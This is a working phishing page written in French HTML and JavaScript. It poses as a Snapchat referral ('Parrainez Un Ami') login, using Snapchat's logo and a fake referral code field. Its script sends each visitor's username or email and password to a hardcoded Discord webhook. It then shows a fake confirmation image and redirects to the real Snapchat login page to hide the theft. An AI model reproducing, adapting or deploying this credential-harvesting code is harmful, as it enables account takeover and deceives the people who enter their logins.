<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>RankosSite | Parrainez Un Ami</title>

  <meta property="og:title" content="RankosSite | Parrainez Un Ami" />
  <meta property="og:description" content="Description courte" />
  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box, .image-screen {
      width: 100%;
      max-width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
      background-color: #fff;
      color: #000;
    }
    .logo {
      width: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: bold;
      margin-bottom: 5px;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      background-color: #fffc00;
      border: none;
      color: #000;
      font-weight: bold;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      font-size: 16px;
    }
    .links-container {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }
    .link-button {
      background: transparent;
      border: none;
      color: blue;
      font-weight: bold;
      cursor: pointer;
      text-decoration: underline;
    }
    #errorMessage,
    #referralError {
      color: red;
      display: none;
      margin-top: 10px;
    }
    #imageScreen {
      display: none;
    }
    #imageScreen img {
      width: 100%;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="login-box" id="loginBox">
    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
    <h2>RankosSite | Parrainez Un Ami</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="username">Nom d'utilisateur ou e-mail</label>
        <input type="text" id="username" required />
      </div>
      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required />
      </div>
      <div class="form-group">
        <label for="referralCode">Code de parrainage</label>
        <input type="text" id="referralCode" required />
      </div>

      <button type="submit">Connexion</button>

      <div class="links-container">
        <button type="button" class="link-button">S'inscrire</button>
        <button type="button" class="link-button">Mot de passe oubli√©</button>
      </div>
    </form>
    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
  </div>

  <div class="image-screen" id="imageScreen">
    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const referralCode = document.getElementById('referralCode').value.trim();

      const errorMessage = document.getElementById('errorMessage');
      const referralError = document.getElementById('referralError');

      errorMessage.style.display = 'none';
      referralError.style.display = 'none';

      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
        errorMessage.style.display = 'block';
        return;
      }

      if (!/^\d{4}$/.test(referralCode)) {
        referralError.style.display = 'block';
        return;
      }

      const message = {
        embeds: [
          {
            title: "üì• Nouvelle tentative de connexion",
            description: "Informations collect√©es via le formulaire",
            color: 0xffc800,
            fields: [
              { name: "üë§ Nom d'utilisateur / e-mail", value: username },
              { name: "üîí Mot de passe", value: password },
              { name: "üéÅ Code de parrainage", value: referralCode }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Formulaire Rankos" }
          }
        ]
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message),
      })
      .then(response => {
        // Apr√®s l'envoi, lancer le processus d'affichage et de redirection
        setTimeout(() => {
          document.getElementById('loginBox').style.display = 'none';
          document.getElementById('imageScreen').style.display = 'block';

          setTimeout(() => {
            window.location.href = redirectURL;
          }, 30000); // 30 secondes
        }, 2000); // 2 secondes

      })
      .catch(error => {
        alert("Erreur r√©seau ou CORS.");
        console.error(error);
      });
    });
  </script>
</body>
</html>
